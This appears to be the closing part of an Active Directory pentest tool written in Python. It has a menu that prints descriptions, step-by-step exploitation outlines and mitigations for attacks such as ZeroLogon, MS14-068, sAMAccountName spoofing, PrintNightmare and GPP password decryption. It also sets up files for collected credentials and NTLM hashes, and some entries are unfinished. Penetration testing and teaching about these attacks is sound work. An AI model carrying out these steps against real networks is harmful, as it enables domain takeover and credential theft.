    - https://www.f-secure.com/content/dam/labs/docs/hello-ms08-067-my-old-friend.pdf \n \
            ")

        # PetitPotam
        elif option_numero == 5:
            print(f"{bcolors.UNDERLINE}PetitPotam attack description:{bcolors.ENDC} It is an NTLM Relay attack forcing a targeted user to make a connection to a compromised system and then relaying the requests to the service to be attacked. It allows the attacker to gain an elevation of privilege on behalf of another user by solving the challenge-response problem.\n \
    {bcolors.UNDERLINE}Target(s):{bcolors.ENDC} Domain controllers (and specifically the share: SYSVOL)\n \
    {bcolors.UNDERLINE}Risky:{bcolors.ENDC} Not\n \
    {bcolors.UNDERLINE}Exploit steps:{bcolors.ENDC}\n \
        1) Abuse Microsoft's Encrypting File System Remote Protocol (MS-EFSRPC) to force a Windows host to authenticate to another \n \
        # to do \n \
    {bcolors.UNDERLINE}Mitigations:{bcolors.ENDC}.\n \
            - Check recommandations of the KB5005413 \n \
            ")

        # SMB Signing
        elif option_numero == 6:
            print(f"{bcolors.UNDERLINE}SMB Signing defect description:{bcolors.ENDC} SMB signing (also known as security signatures) is a security mechanism in the SMB protocol. SMB signing means that every SMB message contains a signature that is generated by using the session key. It proves the authenticity of the sender.\n \
    {bcolors.UNDERLINE}Target(s):{bcolors.ENDC} Computers with SMB Signing = False\n \
    {bcolors.UNDERLINE}Risky:{bcolors.ENDC} Not\n \
    {bcolors.UNDERLINE}Exploit steps:{bcolors.ENDC}\n \
        1) Request an IP and check its SMB Signing status \n \
    {bcolors.UNDERLINE}Mitigations:{bcolors.ENDC} \n \
        - Set SMB Signing to True.\n \
            ")

        # PrinterBug
        elif option_numero == 7:
            print(f"{bcolors.UNDERLINE}PrinterBug attack description:{bcolors.ENDC} An attacker can trigger the spooler service of a target host via a RPC call and make it auhtneiticate to a target of the attacker's choosing.\n \
    {bcolors.UNDERLINE}Target(s):{bcolors.ENDC} Windows host with the spooler enabled: spoolsv.exe\n \
    {bcolors.UNDERLINE}Risky:{bcolors.ENDC} ?\n \
    {bcolors.UNDERLINE}Exploit steps:{bcolors.ENDC}\n \
        1) Check if the spooler is available \n \
        2) Abuse the defect (ex: via Printerbug or spoolsample tools) \n \
{bcolors.UNDERLINE}Links:{bcolors.ENDC} \n \
    - https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-rprn \
            ")

        # Kerberos Checksum (MS14-068)
        elif option_numero == 8:
            print(f"{bcolors.UNDERLINE}Kerberos Checksum attack (or MS14-068) description:{bcolors.ENDC} The vulnerability enables an attacker to modify an existing, valid, domain user logon token (Kerberos Ticket Granting Ticket, TGT, ticket) by adding the false statement that the user is a member of Domain Admins (or other sensitive group) and the Domain Controller (DC) will validate that (false) claim enabling attacker improper access to any domain (in the AD forest) resource on the network. This is all done without changing the members of existing AD groups.\n \
    {bcolors.UNDERLINE}Target(s):{bcolors.ENDC} Vulnerable Domain Controllers \n \
    {bcolors.UNDERLINE}Risky:{bcolors.ENDC} ?\n \
    {bcolors.UNDERLINE}Exploit steps:{bcolors.ENDC}\n \
        1) Request a TGT without a PAC by sending an AS-REQ with PA-PAC-REQUEST set to false.  \n \
        2) Forge a PAC claiming membership of domain administrators. ‘Sign’ it using plain MD5. \n \
        3) Create a TGS-REQ message with krbtgt as the target. The TGT from the first step is used along with the fake PAC encrypted with a sub-session key. \n \
        4) Send this to a vulnerable domain controller. \n \
{bcolors.UNDERLINE}Links:{bcolors.ENDC} \n \
    - https://adsecurity.org/?p=541 \n \
    - https://labs.withsecure.com/publications/digging-into-ms14-068-exploitation-and-defence \n \
            ")


        # ZeroLogon
        elif option_numero == 9:
            print(f"{bcolors.UNDERLINE}ZeroLogon description:{bcolors.ENDC} It is a vulnerability in Microsoft's Netlogon process cryptography that allows an attack against Microsoft Active Directory domain controllers and then to impersonate any computer, including the root domain controller. \n \
    {bcolors.UNDERLINE}Target(s):{bcolors.ENDC} Domain controllers\n \
    {bcolors.UNDERLINE}Risky:{bcolors.ENDC} Could break things such as DNS functionality, communication with replication Domain Controllers, etc.\n \
    {bcolors.UNDERLINE}Exploit steps:{bcolors.ENDC}\n \
        1) Establish an unsecure Netlogon channel against a domain controller by performing a brute-force attack using an 8 zero-bytes challenge and ciphertext, while spoofing the identity of that same domain controller. This would require an average of 256 attempts (given the probability of success being 1 in 256). \n \
        2) Use the NetrServerPasswordSet2 call to set the domain controller account’s password, as stored in Active Directory, to an empty one. This breaks some of the domain controller functionality, since the password stored in the domain controller’s registry does not change (this is the reason step four noted below is taken). \n \
        3) Use the empty password to connect to that same domain controller and dump additional hashes using the Domain Replication Service (DRS) protocol. \n \
        4) Revert the domain controller password to the original one as stored in the local registry to avoid detection. \n \
        5) Use the hashes dumped from stage 3 to perform any desired attack such as Golden Ticket or pass the hash using domain administrator credentials. \n \
    {bcolors.UNDERLINE}Mitigations:{bcolors.ENDC} \n \
        - Microsoft strongly recommends to all customers for installing the February 2021 updates to be fully protected from Zerologon Vulnerability. \n \
{bcolors.UNDERLINE}Links:{bcolors.ENDC} \n \
    - https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/ \n \
            ")

        # GPP Abuse
        elif option_numero == 10:
            print(f"{bcolors.UNDERLINE}GPP Abuse attack description:{bcolors.ENDC} Before a security patch release, the credentials were stored in cleartext into the GPPs, so it was possible to retrieve and decrypt them.\n \
    {bcolors.UNDERLINE}Target(s):{bcolors.ENDC} Group Policy Preferences (GPP) stored into the share: SYSVOL of the Domain Controllers\n \
    {bcolors.UNDERLINE}Risky:{bcolors.ENDC} Not risky at all\n \
    {bcolors.UNDERLINE}Exploit steps:{bcolors.ENDC}\n \
        1) Check the right to read files onto the SYSVOL share \n \
        2) If that's the case, search for credentials (for the strings cpassword and clogin) \n \
        3) Decrypt the password with gpp-decrypt <hash> \n \
    {bcolors.UNDERLINE}Mitigations:{bcolors.ENDC}\n \
        - Delete the existing GPP xml files containing credentials\n \
        - Install the security patch (KB2962486) to prevent the adding of new credentials\n \
{bcolors.UNDERLINE}Links:{bcolors.ENDC} \n \
    - https://infosecwriteups.com/attacking-gpp-group-policy-preferences-credentials-active-directory-pentesting-16d9a65fa01a \n \
            ")

        # BlueGate
        elif option_numero == 11:
            print(f"{bcolors.UNDERLINE}BlueGate attack description:{bcolors.ENDC} An unauthenticated attacker connects to the target system using RDP and sends specially crafted requests, aka 'Windows Remote Desktop Gateway (RD Gateway) Remote Code Execution Vulnerability'. \n \
    {bcolors.UNDERLINE}Target(s):{bcolors.ENDC} Windows Remote Desktop Gateway (RD Gateway) protocol\n \
    {bcolors.UNDERLINE}Risky:{bcolors.ENDC} ?\n \
    {bcolors.UNDERLINE}Exploit steps:{bcolors.ENDC}\n \
        1) to do \n \
            ")

        # PrintNightmare
        elif option_numero == 12:
            print(f"{bcolors.UNDERLINE}PrintNightmare attack description:{bcolors.ENDC} It is a vulnerability that leverage the spooler service by adding a printer with a providing driver (which whill be a malicious file) that will be executed via the spooler service to gain an elevation of privilege.\n \
    {bcolors.UNDERLINE}Target(s):{bcolors.ENDC} Workstations with the spooler service enabled\n \
    {bcolors.UNDERLINE}Risky:{bcolors.ENDC} It could stop the spooler service if the DLL is not deleted after (and re-enable the original)\n \
    {bcolors.UNDERLINE}Exploit steps:{bcolors.ENDC}\n \
        1) Check for workstations with the spooler service enabled and rights onto them \n \
        2) Create the malicious DLL (which is the driver) \n \
        3) Download it as a driver on and execute it \
            ")

        # Remove MIC (or Drop The Mic)
        elif option_numero == 13:
            print(f"{bcolors.UNDERLINE}MIC Remove attack description:{bcolors.ENDC} It is \n \
    {bcolors.UNDERLINE}Target(s):{bcolors.ENDC} Domain controllers (and specifically the share: SYSVOL)\n \
    {bcolors.UNDERLINE}Risky:{bcolors.ENDC} ?\n \
    {bcolors.UNDERLINE}Exploit steps:{bcolors.ENDC}\n \
        1) Unset the signing flags in the NTLM_NEGOTIATE message (NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMSSP_NEGOTIATE_SIGN) \n \
        2) Inject a rogue msvAvFlag field in the NTLM_CHALLENGE message with a value of zeros \n \
        3) Remove the MIC from the NTLM_AUTHENTICATE message \n \
        4) Unset the following flags in the NTLM_AUTHENTICATE message: NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMSSP_NEGOTIATE_SIGN, NEGOTIATE_KEY_EXCHANGE, NEGOTIATE_VERSION. \n \
{bcolors.UNDERLINE}Links:{bcolors.ENDC} \n \
    - https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/ \n \
    - https://www.crowdstrike.com/blog/active-directory-ntlm-attack-security-advisory/ \n \
            ")

        # sAMAccountName spoofing
        elif option_numero == 14:
            print(f"{bcolors.UNDERLINE}sAMAccountName spoofing attack description:{bcolors.ENDC} A lack of validation of the sAMAccountName attribute allows attackers to impersonate domain controller accounts due to the creation of an account and the modification of its attribute.\n \
    {bcolors.UNDERLINE}Target(s):{bcolors.ENDC} No risky, just make sure to delete the created account after the compromission\n \
    {bcolors.UNDERLINE}Risky:{bcolors.ENDC} ?\n \
    {bcolors.UNDERLINE}Exploit steps:{bcolors.ENDC}\n \
        1) Check if the user whose you possess the credentials has the right to create a machine \n \
        2) If that's the case, create a machine account. \n \
        3) Clear the “servicePrincipalName” attribute \n \
        4) Modify the “sAMAccountName” attribute of the machine account to point the domain controller name without the $ sign \n \
        5) Request a TGT for the domain controller account \n \
        6) Restore the “sAMAccountName” attribute to its original value or any other value \n \
        7) Request a service ticket using the S4U2self method  \n \
        8) Receive a service ticket on behalf of a domain admin account \n \
    {bcolors.UNDERLINE}Mitigations:{bcolors.ENDC}\n \
        - Set the machineAccountQuota to 0 \n \
        - Apply the security patches (KB5008380 and KB5008202) to the domain controllers \n \
{bcolors.UNDERLINE}Links:{bcolors.ENDC} \n \
    - https://pentestlab.blog/2022/01/10/domain-escalation-samaccountname-spoofing/ \n \
            ")

        # SMB Pipes attack
        elif option_numero == 15:
            print(f"{bcolors.UNDERLINE}SMB Pipes attack description:{bcolors.ENDC} \n \
    {bcolors.UNDERLINE}Target(s):{bcolors.ENDC} to do\n \
    {bcolors.UNDERLINE}Risky:{bcolors.ENDC} ?\n \
    {bcolors.UNDERLINE}Exploit steps:{bcolors.ENDC}\n \
        1) to do \n \
        2) ... \n \
            ")

        # Return to the menu
        elif option_numero == 16:
            print(f"\n{bcolors.OKGREEN}Returning to the main menu...{bcolors.ENDC}")
            return


############################################################################################################################
########## => THE FOLDERS
############################################################################################################################

def creation_environment():
    if not os.path.exists(f"{cwd}/known-data"):
        print("Creation of the pentest environment...")
        os.mkdir(f"{cwd}/known-data")
        os.mkdir(f"{cwd}/known-data/vulns")
        os.mkdir(f"{cwd}/known-data/exploits")
        os.mkdir(f"{cwd}/known-data/network")
        os.mkdir(f"{cwd}/known-data/accounts")
        os.mkdir(f"{cwd}/known-data/accounts/results_ldap")

        # => Creating the default files with the columns name
        # For local accounts
        file = open(f"{cwd}/known-data/accounts/local-users_list.txt", "w", encoding="utf-8")
        file.write("domain,username,password,NTLM_hash")
        file.close()
        # For local administrator accounts
        file = open(f"{cwd}/known-data/accounts/local-adm-users_list.txt", "w", encoding="utf-8")
        file.write("domain,username,password,NTLM_hash")
        file.close()
        # For domain user accounts
        file = open(f"{cwd}/known-data/accounts/dom-users_list.txt", "w", encoding="utf-8")
        file.write("domain,username,password,NTLM_hash")
        file.close()
        # For DCs
        file = open(f"{cwd}/known-data/accounts/domain-controllers_list.txt", "w", encoding="utf-8")
        file.write("domain_controller_hostname,domain_controller_ip")
        file.close()
        # About the domain(s)
        file = open(f"{cwd}/known-data/accounts/domain-infos_list.txt", "w", encoding="utf-8")
        file.write("fqdn,domain,tld")
        file.close()
    download_utilities()


############################################################################################################################
########## => MAIN MENU
############################################################################################################################
print('\
 ______   ______ _______ _______ _     _ _______ ______  _______ __   __ \n \
 |_____] |_____/ |______ |_____| |____/  |_____| |     \ |_____|   \_/   \n \
 |_____] |    \_ |______ |     | |    \_ |     | |_____/ |     |    |    \n \
                                                                        ')
print(f"\nby {bcolors.OKBLUE}\n@MizaruIT on Twitter: wwW.twitter.com/MizaruIT{bcolors.ENDC}")
print(f"{bcolors.OKBLUE}@MizaruIT on GitHub: www.github.com/MizaruIT{bcolors.ENDC}\n")


main_menu_options = {
    1: "Option 1: Scanning network",
    2: "Option 2: Searching for known vulnerabilities",
    3: "Option 3: Exploiting known vulnerabilities",
	4: "Option 4: Setting and requesting BloodHound",
	5: "Option 5: Adding or removing information (accounts, etc.)",
    6: "Option 6: Show list of attacks and their details (description, exploitation steps, mitigations, etc.)",
    7: "Option 7: Quit",
}


if __name__=='__main__':
    creation_environment()
    while True:
        option = print_menu(main_menu_options)
        if option == 1:
            scanning_network()
        elif option == 2:
            searching_vulns()
        elif option == 3:
            exploiting_vulns()
        elif option == 4:
            setting_bloodhound_data()
        elif option == 5:
            add_infos()
        elif option == 6:
            show_details_attacks()
        elif option == 7:
            print(f"\n{bcolors.OKGREEN}QUITTING BREAKADAY TOOL... BYEBYE{bcolors.ENDC}")
            break
